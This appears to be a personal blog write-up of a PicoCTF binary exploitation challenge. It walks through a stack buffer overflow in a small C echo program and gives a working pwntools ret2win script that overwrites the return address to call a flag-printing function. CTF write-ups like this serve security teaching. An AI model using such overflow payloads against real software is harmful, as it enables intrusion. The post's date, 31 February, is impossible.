---
title: "Echo Escape 1"
date: 2026-02-31 00:00:00 +0800
categories: [Writeups]
tags: [Writeups, PWN]
---

I've decided to try out writeups for the first time since I drank a redbull at 8PM and now I can't sleep, so here's a medium difficulty binary exploitation challenge from PicoCTF 2026

First, I started off reading the description:

>The "secure" echo service welcomes you politely… but what if you don’t stay polite? Can you make it reveal the hidden flag? You can download the program file here and source code.

This was what the source code looked like:
```
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void win() {
    FILE *fp = fopen("flag.txt", "rb");
    if (!fp) {
        perror("[!] Failed to open flag.txt");
        return;
    }

    char buffer[128];
    size_t n = fread(buffer, 1, sizeof(buffer), fp);
    fwrite(buffer, 1, n, stdout);
    fflush(stdout);
    printf("\n");
    fclose(fp);
}

int main() {
    char buf[32];    // Only 32 bytes allocated on the stack

    printf("Welcome to the secure echo service!\n");
    printf("Please enter your name: ");
    fflush(stdout);

    read(0, buf, 128);    // Reads input up to 128 bytes into the 32-byte buffer

    printf("Hello, %s\n", buf);
    printf("Thank you for using our service.\n");

    return 0;
}
```

Since `read(0, buf, 128)` writes more than 32 bytes, it can overflow past the buffer and start overwriting the adjacent memory of the stack.

After checking architecture of the program using **file vuln**, I could conclude that the program was a 64-bit binary:
```
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ea8d17256f06912c64bebf47f9ecf5a141aada81, for GNU/Linux 3.2.0, not stripped
```
`
Meaning that the saved EBP and return address were both respectively 8 bytes. Therefore, to obtain the flag I had to
1. Find the address of win()
2. Craft the payload of 32 bytes + 8 bytes + win() address
3. Send it as an input to the program

##### Finding address of win()
This was as simple as using ***objdump -d ./vuln | grep win*** since I fortunately wasn't dealing with a stripped binary. Executing that command displayed the win() address of 0x401256

##### Crafting payload and sending it as input
We've already found the address of win(). Now it's time to craft the payload
```
from pwn import *
p = remote('mysterious-sea.picoctf.net', 61435)
payload = b'A' * 32 + b'B' * 8 + p64(0x401256)
p.sendline(payload)
p.interactive()
```

And I got the flag!!!!!!
```
Welcome to the secure echo service!
Please enter your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBV\x12@
Thank you for using our service.
picoCTF{REDACT}[*]
```
